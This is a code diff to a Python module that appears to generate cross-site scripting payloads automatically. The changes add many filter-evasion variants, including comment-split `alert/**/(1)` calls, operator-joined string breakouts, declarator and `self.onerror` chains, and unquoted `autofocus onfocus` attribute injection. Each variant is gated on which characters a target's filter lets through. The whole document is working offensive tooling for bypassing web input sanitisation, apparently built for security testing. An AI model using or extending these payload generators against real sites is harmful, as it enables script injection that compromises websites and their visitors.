@@ -44,26 +44,38 @@ _FN_NAME_SPLIT_RE = re.compile(r"[(?`]")
 
 
 def _rebuild_name(
-    name: str, s: str, kw: dict[str, bool]
+    name: str, s: str, kw: dict[str, bool], slash_ok: bool = False
 ) -> list[str]:
     """Call forms for one dialog name split by removed string `s`."""
     parens = kw.get("parentheses", True) and kw.get("gen_call", True)
     btick = kw.get("backtick", True) and kw.get("gen_tick", True)
+    comment_ok = slash_ok and kw.get("comment_close", True)
     arg = "()" if name == "print" else "(1)"
     sp = split_str(name, s)
+    out: list[str] = []
     if parens:
-        return [f"{sp}{arg}"]
+        out.append(f"{sp}{arg}")
+        # `/**/` defeats junction needles (`alert(1)`, `alert`1``) that a
+        # bare rebuilt name still trips after the inner split is deleted.
+        if comment_ok:
+            out.append(f"{sp}/**/{arg}")
     if btick:
-        return [f"{sp}`1`"]
-    return _throw_forms(sp, kw, include_block_fallback=True)
+        out.append(f"{sp}`1`")
+        if comment_ok:
+            out.append(f"{sp}/**/`1`")
+    if not out:
+        return _throw_forms(sp, kw, include_block_fallback=True)
+    return out
 
 
-def _rebuild_fn(s: str, kw: dict[str, bool]) -> list[str]:
+def _rebuild_fn(
+    s: str, kw: dict[str, bool], slash_ok: bool = False
+) -> list[str]:
     """Rebuild all 4 dialog functions using removed-string splitter `s`."""
     return [
         f
         for name in DIALOG_FUNCS
-        for f in _rebuild_name(name, s, kw)
+        for f in _rebuild_name(name, s, kw, slash_ok)
     ]
 
 
@@ -78,7 +90,10 @@ def _sink_fns(kw: dict[str, bool]) -> list[str]:
 
 
 def _rebuild_all(
-    rsplit: list[str], scores: dict[str, int], kw: dict[str, bool]
+    rsplit: list[str],
+    scores: dict[str, int],
+    kw: dict[str, bool],
+    slash_ok: bool = False,
 ) -> list[str]:
     """Name-major rebuild order across all deleted-string splitters."""
     return [
@@ -86,9 +101,28 @@ def _rebuild_all(
         for name in DIALOG_FUNCS
         for s in rsplit
         if required_ok(s, scores)
-        for f in _rebuild_name(name, s, kw)
+        for f in _rebuild_name(name, s, kw, slash_ok)
         if required_ok(f, scores)
     ]
+
+
+def _has_top_level(fn: str, chars: str) -> bool:
+    """True when any char of `chars` appears outside ()[]{} nesting in `fn`.
+
+    A bare `,` or `=` inside an fn cannot sit in operand position:
+    `''*a=b*''` makes `(''*a)` an invalid assignment target, and `''*a,b*''`
+    re-parses the comma as a declarator/argument separator. Such fns are
+    only valid as bare statements, arg-list entries, or declarator inits.
+    """
+    depth = 0
+    for ch in fn:
+        if ch in "([{":
+            depth += 1
+        elif ch in ")]}":
+            depth -= 1
+        elif depth == 0 and ch in chars:
+            return True
+    return False
 
 
 def _add_candidate(
@@ -211,7 +245,7 @@ def _compose_letter_stripper(state: ComposeState) -> None:
                     "non-alphabetic JSFuck in-string execution",
                     "js_string_exec",
                 )
-                if state.slash_ok:
+                if state.slash_ok and state.kw.get("semicolon", True):
                     _add_candidate(
                         state,
                         f"{q};{fn}/*{marker}*/;//",
@@ -260,7 +294,7 @@ def _compose_html(state: ComposeState) -> None:
         if not state.inert:
             if state.script_ok:
                 for fn in jfuncs or (
-                    _rebuild_fn(rsplit[0], kw) if rsplit else []
+                    _rebuild_fn(rsplit[0], kw, state.slash_ok) if rsplit else []
                 ):
                     if _shape_ok(state, "gen_script", fn):
                         _add_candidate(
@@ -272,7 +306,7 @@ def _compose_html(state: ComposeState) -> None:
             else:
                 if kw.get("case_script", True):
                     for fn in jfuncs[:fn_cap] or (
-                        _rebuild_fn(rsplit[0], kw) if rsplit else []
+                        _rebuild_fn(rsplit[0], kw, state.slash_ok) if rsplit else []
                     ):
                         _add_candidate(
                             state,
@@ -281,7 +315,7 @@ def _compose_html(state: ComposeState) -> None:
                             "tag_removed",
                         )
                 for s in rsplit[:3]:
-                    for fn in jfuncs[:fn_cap] or _rebuild_fn(s, kw):
+                    for fn in jfuncs[:fn_cap] or _rebuild_fn(s, kw, state.slash_ok):
                         _add_candidate(
                             state,
                             f"{split_str('<script>', s)}{fn}/*{marker}*/"
@@ -348,7 +382,7 @@ def _compose_html(state: ComposeState) -> None:
                             if "onerror=" in r and "self.onerror=" not in r
                             else r
                         )
-                        for r in _rebuild_fn(s, kw)
+                        for r in _rebuild_fn(s, kw, state.slash_ok)
                     ]
                     for fn0 in hfuncs[:fn_cap] or fallback_fns:
                         if (
@@ -424,7 +458,7 @@ def _compose_html(state: ComposeState) -> None:
                     "protocol",
                 )
         jfns = jfuncs[:fn_cap] or (
-            _rebuild_fn(rsplit[0], kw) if rsplit else []
+            _rebuild_fn(rsplit[0], kw, state.slash_ok) if rsplit else []
         )
         if not kw.get("javascript_proto", True) and rsplit and jfns:
             for jfn in jfns:
@@ -451,6 +485,9 @@ def _compose_html(state: ComposeState) -> None:
             kw.get("entity_lt", True)
             and kw.get("srcdoc", True)
             and kw.get("iframe_tag", True)
+            # `&lpar;`/`&rpar;`/`&sol;` are named entities — unlike `&lt`/`&gt`
+            # they need their `;` to decode, so they die when `;` is stripped.
+            and kw.get("semicolon", True)
             and (
                 not kw.get("parentheses", True)
                 or not state.script_ok
@@ -609,12 +646,35 @@ def _compose_attr(state: ComposeState) -> None:
                             "in-context attribute injection",
                             "attr_inject",
                         )
+                if quote:
+                    for fn in [
+                        f
+                        for f in hfuncs
+                        if " " not in f and quote in f
+                    ][:fn_cap]:
+                        _add_candidate(
+                            state,
+                            f"{sep} autofocus onfocus={fn}//{marker}",
+                            "unquoted handler injection (inner-quote bypass)",
+                            "attr_inject",
+                        )
             elif state.slash_ok and quote:
                 for fn in [f for f in hfuncs if " " not in f][:fn_cap]:
                     _add_candidate(
                         state,
                         f"{quote}/autofocus/onfocus={quote}{fn}",
                         "slash-separated attribute injection (space bypass)",
+                        "attr_inject",
+                    )
+                for fn in [
+                    f
+                    for f in hfuncs
+                    if " " not in f and quote in f
+                ][:fn_cap]:
+                    _add_candidate(
+                        state,
+                        f"{quote}/autofocus/onfocus={fn}//{marker}",
+                        "slash-separated unquoted handler injection (inner-quote bypass)",
                         "attr_inject",
                     )
 
@@ -625,7 +685,7 @@ def _compose_attr_handler(state: ComposeState) -> None:
         _add_candidate(
             state, f"{fn}/*{marker}*/", "in-handler direct call", "attr_inject"
         )
-    if state.quote and state.q_ok:
+    if state.quote and state.q_ok and state.kw.get("semicolon", True):
         for fn in state.hfuncs[: state.fn_cap]:
             _add_candidate(
                 state,
@@ -683,7 +743,8 @@ def _compose_attr_srcdoc(state: ComposeState) -> None:
 
 def _compose_js_raw(state: ComposeState) -> None:
     marker = state.marker
-    if state.js_breakout and state.slash_ok:
+    semi_ok = state.kw.get("semicolon", True)
+    if state.js_breakout and state.slash_ok and semi_ok:
         for fn in state.jfuncs[: state.fn_cap]:
             _add_candidate(
                 state,
@@ -695,13 +756,14 @@ def _compose_js_raw(state: ComposeState) -> None:
         _add_candidate(
             state, f"{fn}/*{marker}*/", "raw JS direct call", "js_string_exec"
         )
-    for fn in state.jfuncs[: state.fn_cap]:
-        _add_candidate(
-            state,
-            f");{fn}/*{marker}*/;//",
-            "raw JS close-call",
-            "js_string_exec",
-        )
+    if semi_ok:
+        for fn in state.jfuncs[: state.fn_cap]:
+            _add_candidate(
+                state,
+                f");{fn}/*{marker}*/;//",
+                "raw JS close-call",
+                "js_string_exec",
+            )
 
 
 def _compose_js_template(state: ComposeState) -> None:
@@ -817,15 +879,150 @@ def _compose_js_string(state: ComposeState) -> None:
             fns = jfuncs
         else:
             fns = []
-        for fn in fns:
-            if ";" not in fn and "throw" not in fn:
+        # `fns` empties when the classical `'-alert(1)-'` junction probe
+        # fails — but that only kills the `-` join. The operator family
+        # below carries its own per-op gates, so fall back to the full
+        # `jfuncs` pool for every gated variant.
+        exec_fns = fns or jfuncs
+        expr_fns = [
+            f for f in exec_fns if ";" not in f and "throw" not in f
+        ]
+        # Operand joins `{q}OP{fn}OP{q}` additionally require the fn to be
+        # a plain operand — top-level `,`/`=` would break out of operand
+        # position (invalid LHS / declarator split). Arg-list `,` joins,
+        # declarator inits and statements accept them.
+        operand_fns = [f for f in expr_fns if not _has_top_level(f, ",=")]
+        if kw.get("minus", True):
+            for fn in operand_fns:
                 _add_candidate(
                     state,
                     f"{quote}-{fn}-{quote}",
                     "in-string JS execution",
                     "js_string_exec",
                 )
-        if state.js_breakout and len(state.js_breakout) > len(quote) and state.slash_ok:
+        # Operator-family breakouts: `{q} OP fn OP {q}` — a filter may strip
+        # `-` (or any single operator) while leaving its siblings, so emit
+        # every expression join gated on its operator's survival. A stripped
+        # operator would leave an unparseable `''fn''` composite that the
+        # static verifier cannot distinguish from a live one. `&&`, `??` and
+        # `?:` are excluded on purpose: the `''` prefix is falsy, so their
+        # RHS never evaluates. Verification waves stop at the first V, so
+        # emission order doubles as try-order.
+        pct_ok = kw.get("double_url_lt", True)
+        op_gates = (
+            ("+", kw.get("plus", True)),
+            ("*", kw.get("star", True)),
+            ("/", state.slash_ok),
+            ("%", pct_ok and kw.get("percent", True)),
+            ("**", kw.get("star", True)),
+            ("|", kw.get("pipe", True)),
+            ("&", kw.get("amp", True)),
+            ("^", kw.get("caret", True)),
+            ("||", kw.get("pipe", True)),
+            ("<<", True),
+            (">>", True),
+            (">>>", True),
+            ("==", kw.get("eq", True)),
+            ("===", kw.get("eq", True)),
+            ("!=", kw.get("bang", True) and kw.get("eq", True)),
+            ("!==", kw.get("bang", True) and kw.get("eq", True)),
+            ("<", True),
+            ("<=", kw.get("eq", True)),
+            (">", True),
+            (">=", kw.get("eq", True)),
+        )
+        for op, ok in op_gates:
+            if not ok:
+                continue
+            for fn in operand_fns[:fn_cap]:
+                _add_candidate(
+                    state,
+                    f"{quote}{op}{fn}{op}{quote}",
+                    f"in-string JS execution ({op} operator)",
+                    "js_string_exec",
+                )
+        # `,` needs context awareness: in expression position (`foo('{q},fn,{q}')`)
+        # it is the comma operator, but in a bare statement context
+        # (`var q='…'`, `x='…'`) it is a *declarator* separator — `,{fn},`
+        # would leave `var q='',alert(1),''` with an invalid binding target
+        # (SyntaxError). Wrap the fn in declarators instead, and add an
+        # onerror chain that needs no parens/backticks/semicolons at all.
+        if kw.get("comma", True):
+            if state.js_breakout == quote:
+                for fn in expr_fns[:fn_cap]:
+                    # A top-level comma inside `fn` would be re-parsed as
+                    # declarator separators — `,w=a,b,z=` declares a bare `b`
+                    # that never evaluates. Skip such fns; the dedicated
+                    # onerror chain below covers that channel. `=` is fine
+                    # here — `w=a=b` chains assignments legally.
+                    if _has_top_level(fn, ","):
+                        continue
+                    _add_candidate(
+                        state,
+                        f"{quote},w={fn},z={quote}",
+                        "in-string JS execution (declarator chain)",
+                        "js_string_exec",
+                    )
+                if kw.get("eq", True) and kw.get("dot", True):
+                    for name in DIALOG_FUNCS:
+                        if kw.get(name, True):
+                            _add_candidate(
+                                state,
+                                f"{quote},w=self.onerror={name},t=undefined_variable,z={quote}",
+                                "in-string JS onerror declarator chain",
+                                "js_string_exec",
+                            )
+            else:
+                for fn in expr_fns[:fn_cap]:
+                    _add_candidate(
+                        state,
+                        f"{quote},{fn},{quote}",
+                        "in-string JS execution (, operator)",
+                        "js_string_exec",
+                    )
+        if kw.get("space", True):
+            for op in (" in ", " instanceof "):
+                for fn in operand_fns[:fn_cap]:
+                    _add_candidate(
+                        state,
+                        f"{quote}{op}{fn}{op}{quote}",
+                        f"in-string JS execution ({op.strip()} operator)",
+                        "js_string_exec",
+                    )
+        # Statement-family alternates when an expression join is impossible:
+        # `';fn;'` terminates the var-decl then runs a statement, `';fn//'`
+        # comments the trailing quote. Both accept `;`/`throw` fns.
+        semi_ok = kw.get("semicolon", True)
+        if semi_ok:
+            for fn in exec_fns[:fn_cap]:
+                _add_candidate(
+                    state,
+                    f"{quote};{fn};{quote}",
+                    "in-string JS statement breakout (;…;)",
+                    "js_string_exec",
+                )
+        if state.slash_ok:
+            close_ops = (
+                ("||", kw.get("pipe", True)),
+                ("+", kw.get("plus", True)),
+                ("-", kw.get("minus", True)),
+            )
+            for op, ok in close_ops:
+                if not ok:
+                    continue
+                for fn in operand_fns[:fn_cap]:
+                    _add_candidate(
+                        state,
+                        f"{quote}{op}{fn}//{quote}",
+                        f"in-string JS execution ({op} + comment close)",
+                        "js_string_exec",
+                    )
+        if (
+            semi_ok
+            and state.js_breakout
+            and len(state.js_breakout) > len(quote)
+            and state.slash_ok
+        ):
             for fn in jfuncs[:fn_cap]:
                 _add_candidate(
                     state,
@@ -833,7 +1030,7 @@ def _compose_js_string(state: ComposeState) -> None:
                     f"structural JS closer ({state.js_breakout})",
                     "js_string_exec",
                 )
-        elif state.slash_ok:
+        elif semi_ok and state.slash_ok:
             for fn in jfuncs[:fn_cap]:
                 _add_candidate(
                     state,
@@ -852,7 +1049,8 @@ def _compose_js_string(state: ComposeState) -> None:
                 allow_chars=allow_esc,
             )
             if (
-                state.js_breakout
+                kw.get("semicolon", True)
+                and state.js_breakout
                 and len(state.js_breakout) > len(quote)
                 and state.slash_ok
             ):
@@ -863,7 +1061,7 @@ def _compose_js_string(state: ComposeState) -> None:
                     "js_string_exec",
                     allow_chars=allow_esc,
                 )
-            elif state.slash_ok:
+            elif state.slash_ok and kw.get("semicolon", True):
                 _add_candidate(
                     state,
                     f"\\{quote};{fn}/*{marker}*/;//",
@@ -912,6 +1110,7 @@ def _compose_comment(state: ComposeState) -> None:
     if (
         state.tags_ok
         and state.hfuncs
+        and kw.get("minus", True)  # `-->` needs its dashes to close the comment
         and kw.get("svg_tag", True)
         and kw.get("onload", True)
     ):
@@ -1059,7 +1258,7 @@ def compose(
         # non-alphanumeric JSFuck `alert(1)` FIRST when `(` and `)` are allowed,
         # before falling back to `onerror=eval;throw 1` sink primitives.
         raw_hfuncs = (
-            ([] if deny else _rebuild_all(state.rsplit, scores, kw_dict))
+            ([] if deny else _rebuild_all(state.rsplit, scores, kw_dict, state.slash_ok))
             + [
                 f
                 for f in jsfuck_funcs(kw_dict, compact=True)
@@ -1069,7 +1268,7 @@ def compose(
         )
     if not raw_jfuncs:
         raw_jfuncs = (
-            ([] if deny else _rebuild_all(state.rsplit, scores, kw_dict))
+            ([] if deny else _rebuild_all(state.rsplit, scores, kw_dict, state.slash_ok))
             + [
                 f
                 for f in jsfuck_funcs(kw_dict, compact=True)
@@ -1077,6 +1276,40 @@ def compose(
             ]
             + [f for f in _sink_fns(kw_dict) if required_ok(f, scores)]
         )
+
+    # Drop fns whose bodies depend on join operators the filter strips —
+    # e.g. `throw-0`, `"al"+"ert"`, `alert?.(1)`. A stripped operator
+    # leaves an unparseable composite that static verification cannot
+    # distinguish from a live one. (`;` and `%` are excluded: `;` inside
+    # `&#...;` char refs still decodes via the no-semicolon grammar, and
+    # the `%`-channel has its own `double_url_lt` gate.)
+    _blocked_fn_chars = {
+        ch
+        for ch, key in (
+            ("+", "plus"),
+            ("-", "minus"),
+            (",", "comma"),
+            ("|", "pipe"),
+            ("&", "amp"),
+            ("^", "caret"),
+            ("!", "bang"),
+            ("=", "eq"),
+            ("?", "quest"),
+            (".", "dot"),
+        )
+        if not kw_dict.get(key, True)
+    }
+    if _blocked_fn_chars:
+        raw_hfuncs = [
+            f
+            for f in raw_hfuncs
+            if not any(c in f for c in _blocked_fn_chars)
+        ]
+        raw_jfuncs = [
+            f
+            for f in raw_jfuncs
+            if not any(c in f for c in _blocked_fn_chars)
+        ]
 
     def _qualify_handler_onerror(fn: str) -> str:
         if "onerror=" in fn and "self.onerror=" not in fn:
